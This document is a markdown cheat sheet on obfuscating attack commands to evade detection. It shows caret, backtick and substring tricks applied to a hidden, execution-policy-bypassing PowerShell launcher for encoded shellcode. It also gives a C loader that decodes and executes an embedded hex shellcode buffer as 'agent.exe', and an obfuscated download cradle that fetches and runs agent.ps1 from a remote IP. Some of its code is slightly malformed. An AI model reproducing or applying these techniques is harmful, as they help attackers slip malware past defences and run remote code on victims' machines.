<br />

# SIMPLE STRING OBFUSCATION TECNICS

<br /><br /><br />

## batch

- string command to obfuscate<br />
`cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`<br />
The above string can be obfuscated using the **batch escape caracter** ^<br />

- string obfuscated<br />

      cm^d.e^xe /c po^w^er^shel^l.ex^e -n^op -w^i^nd h^idd^en -Ex^e^c B^yp^a^ss -no^n^i -en^c $shellcode

---

- string command to obfuscate<br />
`cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`<br />

- using one batch local variable to serve as our **master key** (varObj)

      @echo off
      SET varObj=abcdefghijlmnopqrstuvxzkyW0123456789ABCDEFGHIJLMNOPQRSTUVXZKYW
      %varObj:~3,1%%varObj:~12,1%%varObj:~4,1%.exe /c %varObj:~15,1%%varObj:~14,1%%varObj:~26,1%%varObj:~5,1%%varObj:~17,1%%varObj:~18,1%%varObj:~8,1%%varObj:~5,1%%varObj:~11,1%%varObj:~11,1%.exe -nop -%varObj:~26,1%%varObj:~9,1%%varObj:~4,1%%varObj:~4,1%%varObj:~5,1%%varObj:~13,1% -%varObj:~41,1%%varObj:~22,1%%varObj:~5,1%%varObj:~3,1% %varObj:~38,1%%varObj:~25,1%%varObj:~15,1%%varObj:~1,0%%varObj:~18,1%%varObj:~18,1% -noni -%varObj:~5,1%%varObj:~13,1%%varObj:~3,1% $shellcode
      exit


- Description of varObj master_key:<br />
https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/pedro-Wandoelmo-key.md
      

---

<br /><br /><br />

## bash

- encoding shellcode in **C** to **ANCII**

      \x8b\x5a\x00\x27\x0d\x0a  <-- C shellcode

      8b5a00270d0a              <-- ANCII shellcode


- parsing shellcode data

      cat shellcode.txt | tr -d '\\' | tr -d 'x'

- template C

      #include
      #include
      #include
      #include
      #include
      #include
      #include
      <stdio.h>
      <stdlib.h>
      <unistd.h>
      <string.h>
      <windows.h>
      <tchar.h>
      <stdlib.h>

      void exec_shellcode(unsigned char *shellcode)
      {
      int (*funct)();
      funct = (int (*)()) shellcode;
      (int)(*funct)();
      }

      // return pointer to shellcode
      unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode, int size)
      {
      int j=0;
      shellcode=malloc((size/2));
      int i=0;
      do
      {
      unsigned char temp[3]={0};
      sprintf((char*)temp,”%c%c”,buffer[i],buffer[i+1]);
      shellcode[j] = strtoul(temp, NULL, 16);
      i+=2;
      j++;
      } while(i<size);
      return shellcode;
      }
      int main (int argc, char **argv)
      {
      unsigned char *shellcode;
      unsigned char buffer[]=
      “fce8890000006089e531d2648b5230”
      “8b520c8b52148b72280fb74a2631ff”
      ... SNIP ...
      “b5a25668a695bd9dffd53c067c0a80”
      “fbe07505bb4713726f6a0053ffd5”;
      int size = sizeof(buffer);
      shellcode = decode_shellcode(buffer,shellcode,size);
      exec_shellcode(shellcode);
      }

- compiling with **GCC**

      gcc template.c -o agent.exe

---

<br /><br /><br />

## powershell

- string command to obfuscate<br />
`cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`<br />
The above string can be obfuscated using the **powershell escape caracter** `<br />

- string obfuscated<br />

      cm`d.e`xe /c po`w`er`shel`l.ex`e -n`op -w`i`nd h`idd`en -Ex`e`c B`yp`a`ss -no`n`i -en`c $shellcode

---

- string command to obfuscate<br />
`powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.71/agent.ps1')`<br />
The above string can be obfuscated using **powershell escape caracters** ` and + <br />

- string obfuscated<br />

      $get = New-Object "N`et`Web`Cl`ie`nt"
      p`owe`r`she`l`l.exe IEX ($get).D`ow`n`loa`dSt`rin`g('h'+'t'+'tp'+':'+'//'+'192.168.1.71/agent.ps1')

---

<br />
